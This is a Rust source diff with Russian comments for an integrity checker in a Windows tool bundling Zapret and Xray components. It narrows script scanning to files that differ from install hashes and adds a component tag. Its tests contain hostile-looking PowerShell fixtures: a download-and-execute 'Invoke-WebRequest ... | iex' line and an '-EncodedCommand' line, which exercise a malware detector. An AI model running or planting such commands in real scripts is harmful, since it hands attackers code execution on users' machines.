@@ -75,6 +75,8 @@ pub fn write_manifest(dir: &Path) -> Result<(), String> {
 pub struct Item {
     /// раздел страницы: «Файлы компонентов», «Скрипты» и т. д.
     group: String,
+    /// id компонента, к которому относится пункт (для кнопки «Переустановить»), или пусто
+    comp: String,
     title: String,
     /// ok | warn | bad | info
     state: String,
@@ -82,7 +84,14 @@ pub struct Item {
 }
 
 fn item(title: &str, state: &str, note: Option<String>) -> Item {
-    Item { group: String::new(), title: title.to_string(), state: state.to_string(), note }
+    Item { group: String::new(), comp: String::new(), title: title.to_string(), state: state.to_string(), note }
+}
+
+fn tag(id: &str, mut list: Vec<Item>) -> Vec<Item> {
+    for i in list.iter_mut() {
+        i.comp = id.to_string();
+    }
+    list
 }
 
 fn grouped(group: &str, mut list: Vec<Item>) -> Vec<Item> {
@@ -215,40 +224,48 @@ fn check_files(label: &str, dir: &Path) -> Vec<Item> {
     out
 }
 
-/// Поиск опасных команд в скриптах компонента. Работает без списка хешей, поэтому видит и подмену
-/// скриптов в тех компонентах, где список уже подделан.
+/// Поиск опасных команд в скриптах, которых нет в списке хешей установки (новых или изменённых).
+/// Скрипты, совпавшие с хешами установки, не разбираются: это оригинальные файлы, а в оригинальных
+/// скриптах (например, service.bat) бывают и скачивание, и запуск, и это не угроза.
 fn check_scripts(label: &str, dir: &Path) -> Option<Item> {
-    fn walk(dir: &Path, base: &Path, out: &mut Vec<(String, String)>, count: &mut usize) {
-        let Ok(rd) = fs::read_dir(dir) else { return };
+    let title = format!("{label}: скрипты");
+    let diff = diff_dir(dir).ok().flatten()?;
+    let unverified: std::collections::BTreeSet<&String> = diff.changed.iter().chain(diff.added.iter()).collect();
+    let (mut count, mut checked, mut bad) = (0usize, 0usize, Vec::new());
+    let mut stack = vec![dir.to_path_buf()];
+    while let Some(d) = stack.pop() {
+        let Ok(rd) = fs::read_dir(&d) else { continue };
         for e in rd.flatten() {
             let p = e.path();
             if p.is_dir() {
-                walk(&p, base, out, count);
-            } else if let Ok(rel) = p.strip_prefix(base) {
-                let rel = rel.display().to_string().replace('\\', "/");
-                if !is_script(&rel) || e.metadata().map(|m| m.len() > 2_000_000).unwrap_or(true) {
-                    continue;
-                }
-                *count += 1;
-                let text = fs::read(&p).map(|b| String::from_utf8_lossy(&b).to_string()).unwrap_or_default();
-                let hits = suspicious(&text);
-                if !hits.is_empty() {
-                    out.push((rel, hits.join(", ")));
-                }
+                stack.push(p);
+                continue;
+            }
+            let Ok(rel) = p.strip_prefix(dir) else { continue };
+            let rel = rel.display().to_string().replace('\\', "/");
+            if !is_script(&rel) {
+                continue;
+            }
+            count += 1;
+            if !unverified.contains(&rel) || e.metadata().map(|m| m.len() > 2_000_000).unwrap_or(true) {
+                continue;
+            }
+            checked += 1;
+            let text = fs::read(&p).map(|b| String::from_utf8_lossy(&b).to_string()).unwrap_or_default();
+            let hits = suspicious(&text);
+            if !hits.is_empty() {
+                bad.push(format!("{rel} ({})", hits.join(", ")));
             }
         }
     }
-    let (mut bad, mut count) = (Vec::new(), 0usize);
-    walk(dir, dir, &mut bad, &mut count);
     if count == 0 {
         return None;
     }
-    let title = format!("{label}: скрипты");
     Some(if bad.is_empty() {
-        item(&title, "ok", Some(format!("Проверено скриптов: {count}. Опасных команд (скрытые загрузки, закодированный PowerShell) не найдено.")))
+        let tail = if checked == 0 { "все совпадают с хешами установки".to_string() } else { format!("{checked} новых или изменённых просмотрено, опасных команд нет") };
+        item(&title, "ok", Some(format!("Скриптов: {count}, {tail}.")))
     } else {
-        let list: Vec<String> = bad.iter().map(|(f, w)| format!("{f} ({w})")).collect();
-        item(&title, "bad", Some(format!("В скриптах есть подозрительные команды: {}. Переустановите компонент.", list.iter().take(3).cloned().collect::<Vec<_>>().join("; "))))
+        item(&title, "bad", Some(format!("В новых или изменённых скриптах есть подозрительные команды: {}. Если вы их не писали сами, это может быть вирус.", names(&bad))))
     })
 }
 
@@ -437,16 +454,15 @@ fn check_self() -> Option<Item> {
 }
 
 fn component_checks(id: &str, label: &str, dir: &Path, sigs: &[(&str, &str)], out: &mut Vec<Item>) {
-    out.extend(grouped("Файлы компонентов", check_files(label, dir)));
+    out.extend(grouped("Файлы компонентов", tag(id, check_files(label, dir))));
     if let Some(i) = check_scripts(label, dir) {
-        out.push(Item { group: "Скрипты".into(), ..i });
+        out.push(Item { group: "Скрипты".into(), comp: id.into(), ..i });
     }
     for (file, rel) in sigs {
         if let Some(i) = check_signature(label, file, &dir.join(rel)) {
-            out.push(Item { group: "Подписи".into(), ..i });
+            out.push(Item { group: "Подписи".into(), comp: id.into(), ..i });
         }
     }
-    let _ = id;
 }
 
 fn run_check() -> Vec<Item> {
@@ -461,7 +477,7 @@ fn run_check() -> Vec<Item> {
         component_checks("telegram", "Запрет Telegram", &dir, &[], &mut out);
         if let Some(py) = crate::telegram::runtime_python() {
             if let Some(i) = check_signature("Встроенный Python", "python.exe", &py) {
-                out.push(Item { group: "Подписи".into(), ..i });
+                out.push(Item { group: "Подписи".into(), comp: "telegram".into(), ..i });
             }
         }
     }
@@ -537,7 +553,7 @@ async fn verify_online() -> Vec<Item> {
     let mut out = Vec::new();
     for (id, label) in [("discord", "Запрет Discord и YouTube"), ("telegram", "Запрет Telegram"), ("vless", "VLESS (Xray-core)"), ("proxy", "Proxy (Xray-core)")] {
         if crate::modules::active_dir(id).is_ok() {
-            out.extend(grouped("Сверка с GitHub", verify_one(id, label).await));
+            out.extend(grouped("Сверка с GitHub", tag(id, verify_one(id, label).await)));
         }
     }
     if out.is_empty() {
@@ -685,10 +701,42 @@ mod tests {
         fs::write(dir.join("updater.ps1"), b"x").unwrap();
         let r = check_files("T", &dir);
         assert!(r.iter().any(|i| i.state == "bad" && i.title.contains("исполняемые")));
-        // скрипты
+        // скрипты: оригинальные (совпадают с хешами) не разбираются, даже если выглядят опасно
+        let ok = check_scripts("T", &dir).unwrap();
+        assert_eq!(ok.state, "ok");
+        write_manifest(&dir).unwrap();
+        fs::write(dir.join("service.bat"), b"powershell Invoke-WebRequest http://x | iex").unwrap();
+        write_manifest(&dir).unwrap();
+        assert_eq!(check_scripts("T", &dir).unwrap().state, "ok", "оригинальный скрипт");
+        fs::write(dir.join("evil.bat"), b"powershell -nop -EncodedCommand AAAA").unwrap();
+        assert_eq!(check_scripts("T", &dir).unwrap().state, "bad", "новый скрипт");
+        let _ = fs::remove_dir_all(&dir);
+    }
+
+    /// На настоящем релизе Flowseal (если он скачан рядом) свежая установка не даёт нарушений.
+    #[test]
+    fn fresh_flowseal_release_is_clean() {
+        let src = Path::new("/home/claude/flowseal/zapret-discord-youtube");
+        if !src.is_dir() {
+            return;
+        }
+        let dir = std::env::temp_dir().join(format!("bunt-integrity-fs-{}", std::process::id()));
+        let _ = fs::remove_dir_all(&dir);
+        fn copy(a: &Path, b: &Path) {
+            fs::create_dir_all(b).unwrap();
+            for e in fs::read_dir(a).unwrap().flatten() {
+                if e.file_name() == ".git" {
+                    continue;
+                }
+                let (p, q) = (e.path(), b.join(e.file_name()));
+                if p.is_dir() { copy(&p, &q) } else { fs::copy(&p, &q).unwrap(); }
+            }
+        }
+        copy(src, &dir);
+        write_manifest(&dir).unwrap();
+        let r = check_files("T", &dir);
+        assert!(r.iter().all(|i| i.state == "ok"), "{:?}", r.iter().map(|i| (&i.title, &i.state)).collect::<Vec<_>>());
         assert_eq!(check_scripts("T", &dir).unwrap().state, "ok");
-        fs::write(dir.join("general.bat"), b"powershell -nop -w hidden -EncodedCommand AAAA").unwrap();
-        assert_eq!(check_scripts("T", &dir).unwrap().state, "bad");
         let _ = fs::remove_dir_all(&dir);
     }
 
